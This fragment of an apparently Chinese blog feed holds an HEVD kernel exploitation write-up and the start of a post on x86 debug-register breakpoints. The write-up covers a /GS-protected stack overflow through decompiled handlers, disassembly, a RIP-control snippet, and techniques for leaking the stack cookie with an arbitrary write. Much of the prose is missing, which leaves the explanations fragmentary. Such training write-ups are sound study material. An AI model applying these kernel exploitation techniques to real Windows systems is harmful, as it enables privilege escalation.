db ? ; undefined</span><br><span class="line">+0000000000000000  r              db 8 dup(?)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RtlFillMemory</span>(lpBuffer, <span class="number">0x1000</span>, <span class="number">0x43</span>);</span><br><span class="line">PDWORD64 rop = (PDWORD64)((PCHAR)lpBuffer + <span class="number">0x818</span>);</span><br><span class="line">*rop = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>: kd&gt; r rsp</span><br><span class="line">rsp=fffff3082725a708</span><br><span class="line"><span class="number">4</span>: kd&gt; t</span><br><span class="line"><span class="number">00000000</span>`deadbeef ??              ???</span><br></pre></td></tr></table></figure><p></p><ul><li>ROPSMEP&#x2F;SMAP</li><li>shellcode</li></ul><h2 id="With-GS"><a href="#With-GS" class="headerlink" title="With GS"></a>With GS</h2><p>code</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222007</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackGSIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerBufferOverflowStackGS</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 KernelBuffer[<span class="number">512</span>]; <span class="comment">// [rsp+20h] [rbp-238h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(KernelBuffer));</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0x200</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x200</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack (GS)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memmove</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cookie</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">00000001400867E4</span>                 call    memmove</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span>                 jmp     <span class="type">short</span> loc_140086806</span><br><span class="line">PAGE:<span class="number">00000001400867E9</span> ;   &#125; <span class="comment">// starts at 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB $LN6_1:                                 ; DATA XREF: .rdata:<span class="number">00000001400026</span>D0o</span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB ;   __except(<span class="number">1</span>) <span class="comment">// owned by 140086754</span></span><br><span class="line">PAGE:<span class="number">00000001400867</span>EB                 mov     ebx, eax</span><br><span class="line">PAGE:<span class="number">00000001400867</span>ED                 mov     r9d, eax</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>0                 lea     r8, aExceptionCode0 ; <span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span></span><br><span class="line">PAGE:<span class="number">00000001400867F</span>7                 mov     edx, <span class="number">3</span>          ; Level</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>C                 lea     ecx, [Size+<span class="number">4</span>Ah] ; ComponentId</span><br><span class="line">PAGE:<span class="number">00000001400867F</span>F                 call    cs:__imp_DbgPrintEx</span><br><span class="line">PAGE:<span class="number">0000000140086805</span>                 nop</span><br><span class="line">PAGE:<span class="number">0000000140086806</span></span><br><span class="line">PAGE:<span class="number">0000000140086806</span> loc_140086806:                          ; CODE XREF: TriggerBufferOverflowStackGS+D9j</span><br><span class="line">PAGE:<span class="number">0000000140086806</span>                 mov     eax, ebx</span><br><span class="line">PAGE:<span class="number">0000000140086808</span>                 mov     UserBuffer, [rsp+<span class="number">258</span>h+var_38]</span><br><span class="line">PAGE:<span class="number">0000000140086810</span>                 <span class="keyword">xor</span>     UserBuffer, rsp ; StackCookie</span><br><span class="line">PAGE:<span class="number">0000000140086813</span>                 call    __security_check_cookie</span><br><span class="line">PAGE:<span class="number">0000000140086818</span>                 mov     rbx, [rsp+<span class="number">258</span>h+arg_10]</span><br><span class="line">PAGE:<span class="number">0000000140086820</span>                 add     rsp, <span class="number">230</span>h</span><br><span class="line">PAGE:<span class="number">0000000140086827</span>                 pop     r15</span><br><span class="line">PAGE:<span class="number">0000000140086829</span>                 pop     r14</span><br><span class="line">PAGE:<span class="number">000000014008682B</span>                 pop     r12</span><br><span class="line">PAGE:<span class="number">000000014008682</span>D                 pop     rdi</span><br><span class="line">PAGE:<span class="number">000000014008682</span>E                 pop     rsi</span><br><span class="line">PAGE:<span class="number">000000014008682F</span>                 retn</span><br></pre></td></tr></table></figure><p>GS: Cookie <a href="https://learn.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=msvc-170">&#x2F;GS</a> Cookie  Cookie  </p><p>var_38cookie</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0000000000000238</span> KernelBuffer    db <span class="number">512</span> <span class="built_in">dup</span>(?)</span><br><span class="line"><span class="number">-0000000000000038</span> var_38          dq ?</span><br><span class="line"><span class="number">-0000000000000030</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000002</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000029</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000028</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000027</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000026</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000025</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000024</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000023</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000022</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000021</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000020</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000001</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000019</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000018</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000017</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000016</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000015</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000014</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000013</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000012</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000011</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000010</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000F</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000B</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-000000000000000</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000009</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000008</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000003</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000002</span>                 db ? ; undefined</span><br><span class="line"><span class="number">-0000000000000001</span>                 db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000000</span>  r              db <span class="number">8</span> <span class="built_in">dup</span>(?)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PAGE:<span class="number">0000000140086724</span>                 mov     rax, cs:__security_cookie</span><br><span class="line">PAGE:<span class="number">000000014008672B</span>                 <span class="keyword">xor</span>     rax, rsp</span><br><span class="line">PAGE:<span class="number">000000014008672</span>E                 mov     [rsp+<span class="number">258</span>h+var_38], rax</span><br></pre></td></tr></table></figure><p>cookie</p><ul><li>x86 SEH  exception handler  64  32  SEH 64  SEH <a href="https://sup817ch.github.io/2020/09/04/Windows-x64-SEH%E7%AC%94%E8%AE%B0/">(1)</a> SEH </li><li> .data   cookie  HEVD <code>TriggerArbitraryWrite</code> security_cookie </li><li>  64 </li><li> cookie  xored security_cookie   cookie  xored security_cookie  RSP </li></ul><p>rsp</p><p><code>NtQuerySystemInformation</code><code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code> StackBase  StackLimit StackBase StackLimit  StackBase  StackLimit </p><p>what to where: </p><ul><li>wherewhat &#x3D;&gt; </li><li>wherebufferwhat &#x3D;&gt; </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200B</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">ArbitraryWriteIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> LABEL_64;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">TriggerArbitraryWrite</span><span class="params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 *What; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *Where; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserWriteWhatWhere, <span class="number">0x10</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  What = UserWriteWhatWhere-&gt;What;</span><br><span class="line">  Where = UserWriteWhatWhere-&gt;Where;</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%zX\n&quot;</span>, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);</span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);</span><br><span class="line">  *Where = *What;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NtQuerySystemInformation(ZwQuerySystemInformation)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>SYSTEM_INFORMATION_CLASS</code><a href="https://blog.csdn.net/weixin_42270114/article/details/125803630"></a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">SystemExtendedProcessInformation = <span class="number">0x39</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure><p><code>SystemInformation</code> </p><p><code>SystemInformationLength</code>SystemInformation</p><p><code>ReturnLength</code><code>SystemInformationLength</code></p><p><a href="https://gist.github.com/TheWover/799822ce3d1239e0bd5764ac0b0adfda">List process information including process architecture and username</a></p><p> <code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_PROCESS_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">ULONG NextEntryOffset;</span><br><span class="line">ULONG NumberOfThreads;</span><br><span class="line">LARGE_INTEGER SpareLi1;</span><br><span class="line">LARGE_INTEGER SpareLi2;</span><br><span class="line">LARGE_INTEGER SpareLi3;</span><br><span class="line">LARGE_INTEGER CreateTime;</span><br><span class="line">LARGE_INTEGER UserTime;</span><br><span class="line">LARGE_INTEGER KernelTime;</span><br><span class="line">UNICODE_STRING ImageName;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">ULONG ProcessId;</span><br><span class="line">ULONG InheritedFromUniqueProcessId;</span><br><span class="line">ULONG HandleCount;</span><br><span class="line">ULONG SessionId;</span><br><span class="line">PVOID PageDirectoryBase;</span><br><span class="line">VM_COUNTERS VirtualMemoryCounters;</span><br><span class="line">SIZE_T PrivatePageCount;</span><br><span class="line">IO_COUNTERS IoCounters;</span><br><span class="line">SYSTEM_EXTENDED_THREAD_INFORMATION Threads[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_EXTENDED_PROCESS_INFORMATION, * PSYSTEM_EXTENDED_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>NumberOfThread<code>SYSTEM_EXTENDED_THREAD_INFORMATION Threads[1];</code>StackBaseStackLimit</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_EXTENDED_THREAD_INFORMATION</span></span><br><span class="line">&#123;</span><br><span class="line">    SYSTEM_THREAD_INFORMATION ThreadInfo;</span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID Win32StartAddress;</span><br><span class="line">    PVOID TebBase; <span class="comment">// since VISTA</span></span><br><span class="line">    ULONG_PTR Reserved2;</span><br><span class="line">    ULONG_PTR Reserved3;</span><br><span class="line">    ULONG_PTR Reserved4;</span><br><span class="line">&#125; SYSTEM_EXTENDED_THREAD_INFORMATION, * PSYSTEM_EXTENDED_THREAD_INFORMATION;</span><br></pre></td></tr></table></figure><p>securityCookie</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000140003010</span> ; <span class="type">uintptr_t</span> _security_cookie</span><br><span class="line">.data:<span class="number">0000000140003010</span> __security_cookie dq <span class="number">2B</span>992DDFA232h </span><br></pre></td></tr></table></figure><p> handler <code>nt!NtDeviceIoControlFile</code><code>nt!NtDeviceIoControlFile+0x56</code></p><p>TriggerStackOverflow</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;<span class="number">0xfffff88b1fdbf000</span><span class="number">-0xfffff88b1fdc44b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br><span class="line"></span><br><span class="line">Python&gt;<span class="number">0xfffff88b1dc8d000</span><span class="number">-0xfffff88b1dc924b0</span></span><br><span class="line"><span class="number">-0x54b0</span></span><br></pre></td></tr></table></figure><p>rsp</p><p>memmove</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RAX: <span class="number">0000000000000000</span>   RBX: <span class="number">0000000000000000</span>   RCX: FFFFEC8EDD1724D0   </span><br><span class="line">RDX: <span class="number">00000250870E0000</span>   RSI: <span class="number">0000000000000008</span>   RDI: <span class="number">00000250870E0000</span>   </span><br><span class="line">RIP: FFFFF801211467E4   RSP: FFFFEC8EDD1724B0   RBP: FFFFAC01F21BCE50   </span><br><span class="line">R8:  <span class="number">0000000000000008</span>   R9:  <span class="number">000000000000004</span>D   R10: <span class="number">0000000000000000</span>   </span><br><span class="line">R11: FFFFEC8EDD1724A8   R12: <span class="number">0000000000000200</span>   R13: FFFFAC01F2AC9E10   </span><br><span class="line">R14: <span class="number">000000000000004</span>D   R15: <span class="number">0000000000000003</span> </span><br></pre></td></tr></table></figure><p>Exception</p><ul><li>0x1000(0x270)</li></ul><p> bypass SMEP</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://github.com/vportal/HEVD">HEVD exploits for Windows 10</a></li><li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">HEVD Exploit - Stack OverflowGS on Windows 10</a></li><li>[HEVD exploit ] StackOverflowGS](<a href="https://www.zoemurmure.top/posts/hevd_stackoberflowgs/">https://www.zoemurmure.top/posts/hevd_stackoberflowgs/</a>)</li><li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">Windows x64 </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> HEVD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/03/31/%E6%96%AD%E7%82%B9/"/>
      <url>/2024/03/31/%E6%96%AD%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<blockquote><p>debug break point</p></blockquote><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>Debug Register</p><p> CPU  x86  CPU  8 DR0-DR7</p><ul><li>DR0-DR3 <em>Linear Address</em> 4 </li><li>DR4  DR5 </li><li>DR6 </li><li>DR7   1 INT1INT1 </li></ul><p><a href="https://bbs.kanxue.com/thread-248728.htm"></a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DBG_REG7</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    // (L0~3)(G0~3)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">unsigned</span> L0 : <span class="number">1</span>;  <span class="comment">// Dr0 </span></span><br><span class="line">    <span class="type">unsigned</span> G0 : <span class="number">1</span>;  <span class="comment">// Dr0 </span></span><br><span class="line">    <span class="type">unsigned</span> L1 : <span class="number">1</span>;  <span class="comment">// Dr1 </span></span><br><span class="line">    <span class="type">unsigned</span> G1 : <span class="number">1</span>;  <span class="comment">// Dr1 </span></span><br><span class="line">    <span class="type">unsigned</span> L2 : <span class="number">1</span>;  <span class="comment">// Dr2 </span></span><br><span class="line">    <span class="type">unsigned</span> G2 : <span class="number">1</span>;  <span class="comment">// Dr2 </span></span><br><span class="line">    <span class="type">unsigned</span> L3 : <span class="number">1</span>;  <span class="comment">// Dr3 </span></span><br><span class="line">    <span class="type">unsigned</span> G3 : <span class="number">1</span>;  <span class="comment">// Dr3 </span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> LE : <span class="number">1</span>;   <span class="comment">// local exception</span></span><br><span class="line">    <span class="type">unsigned</span> GE : <span class="number">1</span>;   <span class="comment">// global exception</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="type">unsigned</span> Reserve1 : <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="type">unsigned</span> GD : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="type">unsigned</span> Reserve2 : <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> RW0 : <span class="number">2</span>;   <span class="comment">// Dr0</span></span><br><span class="line">    <span class="type">unsigned</span> LEN0 : <span class="number">2</span>;  <span class="comment">// Dr0</span></span><br><span class="line">    <span class="type">unsigned</span> RW1 : <span class="number">2</span>;   <span class="comment">// Dr1</span></span><br><span class="line">    <span class="type">unsigned</span> LEN1 : <span class="number">2</span>;  <span class="comment">// Dr1</span></span><br><span class="line">    <span class="type">unsigned</span> RW2 : <span class="number">2</span>;   <span class="comment">// Dr2</span></span><br><span class="line">    <span class="type">unsigned</span> LEN2 : <span class="number">2</span>;  <span class="comment">// Dr2</span></span><br><span class="line">    <span class="type">unsigned</span> RW3 : <span class="number">2</span>;   <span class="comment">// Dr3</span></span><br><span class="line">    <span class="type">unsigned</span> LEN3 : <span class="number">2</span>;  <span class="comment">// Dr3</span></span><br><span class="line">&#125;DBG_REG7, *PDBG_REG7;</span><br></pre></td></tr></table></figure><p>DR0-DR3(RW0-RW3)(LEN0-LEN3)  </p><ul><li>RW: 00 01 11  </li><li>LEN: 001 012 114</li></ul><p><strong></strong>1(LEN0-LEN301)</p><p><strong></strong>12244</p><p></p><p>DBG_REG7</p><ul><li>L0 &#x3D; 0b1</li><li>LE &#x3D; 0b1 exception</li><li>RW0 &#x3D; 0b11</li><li>LEN0 &#x3D; 0b11</li></ul><p>CTF<a href="https://blingblingxuanxuan.github.io/2023/07/05/230705-sctf2023-kernel-pwn-sycrop/">SCTF 2023 Kernel Pwn 